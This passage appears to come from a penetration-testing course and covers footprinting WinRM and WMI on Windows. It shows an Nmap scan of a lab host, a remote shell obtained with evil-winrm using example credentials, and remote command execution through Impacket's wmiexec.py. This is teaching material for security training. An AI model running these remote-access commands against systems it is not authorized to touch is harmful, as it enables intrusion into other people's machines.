<p>Another component that fits WinRM for administration is Windows Remote Shell (<code>WinRS</code>), which lets us execute arbitrary commands on the remote system. The program is even included on Windows 7 by default. Thus, with WinRM, it is possible to execute a remote command on another server.</p>
<p>Services like remote sessions using PowerShell and event log merging require WinRM. It is enabled by default starting with the <code>Windows Server 2012</code> version, but it must first be configured for older server versions and clients, and the necessary firewall exceptions created.</p>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>As we already know, WinRM uses TCP ports <code>5985</code> (<code>HTTP</code>) and <code>5986</code> (<code>HTTPS</code>) by default, which we can scan using Nmap. However, often we will see that only HTTP (<code>TCP 5985</code>) is used instead of HTTPS (<code>TCP 5986</code>).</p>
<p><strong>Nmap WinRM</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ nmap -sV -sC <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.248</span> -p5985,<span class="hljs-number">5986</span> --disable-arp-ping -n

Starting Nmap <span class="hljs-number">7.92</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2021-11-06 16:31 CET</span>
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.248</span>
Host is up (<span class="hljs-number">0.030</span>s latency).

PORT     STATE SERVICE VERSION
<span class="hljs-number">5985</span><span class="hljs-regexp">/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/</span>UPnP)
|_http-<span class="hljs-string">title:</span> Not Found
|_http-server-<span class="hljs-string">header:</span> Microsoft-HTTPAPI/<span class="hljs-number">2.0</span>
Service <span class="hljs-string">Info:</span> <span class="hljs-string">OS:</span> Windows; <span class="hljs-string">CPE:</span> <span class="hljs-string">cpe:</span>/<span class="hljs-string">o:</span><span class="hljs-string">microsoft:</span>windows

Service detection performed. Please report any incorrect results at <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">7.34</span> seconds
</code></pre>
<p>If we want to find out whether one or more remote servers can be reached via WinRM, we can easily do this with the help of PowerShell. The <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2">Test-WsMan</a> cmdlet is responsible for this, and the host&#39;s name in question is passed to it. In Linux-based environments, we can use the tool called <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>, another penetration testing tool designed to interact with WinRM.</p>
<pre><code class="lang-shell-session">[!bash!]$ evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information,<span class="hljs-built_in"> check </span>Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span>

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Cry0l1t3\Documents&gt;
</code></pre>
<hr>
<h3 id="wmi">WMI</h3>
<p>Windows Management Instrumentation (<code>WMI</code>) is Microsoft&#39;s implementation and also an extension of the Common Information Model (<code>CIM</code>), core functionality of the standardized Web-Based Enterprise Management (<code>WBEM</code>) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (<code>WMIC</code>). WMI is not a single program but consists of several programs and various databases, also known as repositories.</p>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>The initialization of the WMI communication always takes place on <code>TCP</code> port <code>135</code>, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a> from the Impacket toolkit can be used for this.</p>
<p><strong>WMIexec.py</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:<span class="hljs-string">"P455w0rD!"</span>@<span class="hljs-number">10.129</span><span class="hljs-meta">.201</span><span class="hljs-meta">.248</span> <span class="hljs-string">"hostname"</span>

Impacket v0<span class="hljs-meta">.9</span><span class="hljs-meta">.22</span> - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

[*] SMBv3<span class="hljs-meta">.0</span> dialect used
ILF-SQL-<span class="hljs-number">01</span>
</code></pre>
<p>Again, it is necessary to mention that the knowledge gained from installing these services and playing around with the configurations on our own Windows Server VM for gaining experience and developing the functional principle and the administrator&#39;s point of view cannot be replaced by reading manuals. Therefore, we strongly recommend setting up your own Windows Server, experimenting with the settings, and scanning these services repeatedly to see the differences in the results.</p>
